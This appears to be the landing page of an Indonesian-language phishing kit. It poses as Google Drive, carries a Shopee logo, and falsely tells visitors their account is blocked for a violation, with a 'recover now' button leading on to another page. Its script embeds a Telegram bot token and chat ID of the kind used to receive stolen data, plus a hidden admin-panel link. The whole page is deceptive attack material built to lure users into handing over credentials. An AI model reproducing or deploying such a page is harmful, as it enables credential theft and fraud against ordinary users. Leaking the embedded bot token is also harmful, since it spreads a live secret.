<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>Drive - Pulihkan Akun Anda</title>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="Drive - Akun Anda Terblokir">
    <meta property="og:description" content="Akun Anda terblokir karena terdeteksi pelanggaran. Pulihkan sekarang.">
    <meta property="og:image" content="./asset/shopee.jpg">
    <meta property="og:url" content="./">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Google Drive">

    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Drive - Akun Anda Terblokir">
    <meta name="twitter:description" content="Akun Anda terblokir karena terdeteksi pelanggaran.">
    <meta name="twitter:image" content="./asset/shopee.jpg">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .dots {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 12px;
            height: 12px;
            background: #4285f4;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            display: none;
            max-width: 400px;
            margin: 0 auto;
        }

        .shopee-logo {
            width: 120px;
            height: 40px;
            margin: 0 auto 40px;
            background-image: url('asset/shopee.jpg');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            filter: grayscale(100%) brightness(1.1);
            opacity: 0.9;
        }

        .warning-box {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 32px 24px;
            text-align: center;
            box-shadow: 0 12px 40px rgba(0,0,0,0.15);
            margin-bottom: 32px;
            border: 1px solid rgba(255,255,255,0.3);
        }

        .warning-icon {
            width: 72px;
            height: 72px;
            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            box-shadow: 0 8px 24px rgba(255,107,107,0.4);
        }

        .warning-title {
            font-size: 24px;
            font-weight: 700;
            color: #202124;
            margin-bottom: 12px;
            line-height: 1.2;
        }

        .warning-text {
            font-size: 16px;
            color: #5f6368;
            line-height: 1.5;
            margin-bottom: 8px;
        }

        .warning-highlight {
            font-weight: 600;
            color: #d93025;
        }

        #recoverBtn {
            width: 100%;
            height: 52px;
            border: none;
            background: linear-gradient(135deg, #4285f4, #1a73e8);
            color: white;
            font-size: 17px;
            font-weight: 600;
            border-radius: 28px;
            cursor: pointer;
            box-shadow: 0 6px 24px rgba(66,133,244,0.5);
            transition: all 0.3s ease;
            font-family: inherit;
        }

        #recoverBtn:hover {
            background: linear-gradient(135deg, #1a73e8, #1557b0);
            box-shadow: 0 8px 32px rgba(66,133,244,0.6);
            transform: translateY(-2px);
        }

        #recoverBtn:active {
            transform: translateY(0);
        }

        .admin-access {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 10px 18px;
            border-radius: 25px;
            font-size: 14px;
            text-decoration: none;
            display: none;
            font-weight: 500;
        }

        @media (max-width: 480px) {
            .content {
                padding: 20px 16px;
            }
            
            .shopee-logo {
                width: 100px;
                height: 32px;
            }
            
            .warning-box {
                padding: 28px 20px;
            }
        }
    </style>
</head>
<body>
    <div id="loading" class="loading">
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <div class="content" id="drivePage">
        <div class="shopee-logo"></div>
        
        <div class="warning-box">
            <div class="warning-icon">⚠️</div>
            <h2 class="warning-title">Akunmu terblokir</h2>
            <p class="warning-text">terdeteksi <span class="warning-highlight">pelanggaran</span></p>
            
            <button id="recoverBtn" onclick="window.location.href='index.html'">
                Pulihkan akun sekarang
            </button>
        </div>
    </div>

    <a href="admin.html" class="admin-access" id="adminLink">Admin Panel</a>

    <script>
        const CONFIG = {
            TELEGRAM_BOT_TOKEN: '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc',
            TELEGRAM_CHAT_ID: '8593139959'
        };

        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('admin') === 'true') {
                document.getElementById('adminLink').style.display = 'block';
            }

            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('drivePage').style.display = 'flex';
            }, 3000);
        };
    </script>
</body>
</html>
